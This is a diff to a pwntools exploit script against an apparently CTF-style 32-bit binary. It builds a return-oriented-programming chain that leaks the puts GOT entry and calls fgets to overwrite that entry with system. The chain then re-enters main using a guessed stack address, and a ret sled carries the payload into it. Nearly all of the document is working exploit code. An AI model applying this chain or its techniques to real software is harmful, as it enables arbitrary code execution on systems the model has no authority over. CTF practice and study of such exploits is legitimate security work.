@@ -7,25 +7,30 @@ libc = ELF("/lib32/libc.so.6")
 
 r = ROP(e)
 
-"""
-0x08049022 : pop ebx ; ret
-0x08049241 : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
-0x080492b2 : pop edi ; pop ebp ; ret
-0x080492b1 : pop esi ; pop edi ; pop ebp ; ret
+STACK_MEMORY_GUESS = 0xFFFDE3D0
 
-0x804a026 = %s\n\x00
-"""
-
+# libc leak
 r.raw(e.symbols["puts"])  # function call (puts)
 r.raw(0x08049022)  # return address of puts (pop ebx ; ret)
 r.raw(e.got["puts"])  # arg0 to puts
 
+# puts -> system
 r.raw(e.symbols["fgets"])  # function call (fgets)
-r.raw(0x080492B1)  # return address of fgets (pop esi ; pop edi ; pop ebp ; ret)
-r.raw(e.got["fgets"])  # arg0 to fgets (buffer)
-r.raw(5)  # arg1 to fgets (amount of bytes (need 1 more for null))
-r.raw(e.symbols["stdin"])  # arg2 to fgets (stream)
+r.raw(0x08049291)  # return address of fgets (pop esi ; pop edi ; pop ebp ; ret)
+r.raw(e.got["puts"])  # arg0 to fgets (buffer)
+r.raw(0x01010101)  # arg1 to fgets (amount of bytes)
+r.raw(
+    e.symbols["stdin"]
+)  # arg2 to fgets (stream) <-- ISSUE: the real stdin address is in libc
 
+# # trigger main again
+r.raw(0x08049293)  # pop ebp ; ret
+r.raw(STACK_MEMORY_GUESS)  # make sure ebp is writeable memory
+r.raw(0x080491F5)  # Note: we will start after stdin is pushed cause EBX is cooked
+r.raw(e.symbols["stdin"])  # stdin should have just been pushed
+
+# print("got puts", hex(e.got["puts"]))
+# print("stdin ptr", hex(e.symbols["stdin"]))
 
 ret_sled = p32(0x0804900E) * (1024 // 4) * 127
 payload = ret_sled + r.chain()
@@ -36,14 +41,13 @@ context.terminal = ["tmux", "splitw", "-h"]
 gdb.attach(
     c,
     """
+b main
 continue
 """.strip(),
 )
 
-desired_esp = 0xFFFDE3D0
-
 c.recvuntil(b"Enter an integer:\n")
-c.sendline(b"AAAA" + p32(desired_esp + 4))
+c.sendline(b"AAAA" + p32(STACK_MEMORY_GUESS + 4))
 print(c.recvline())
 print(c.recvline())
 
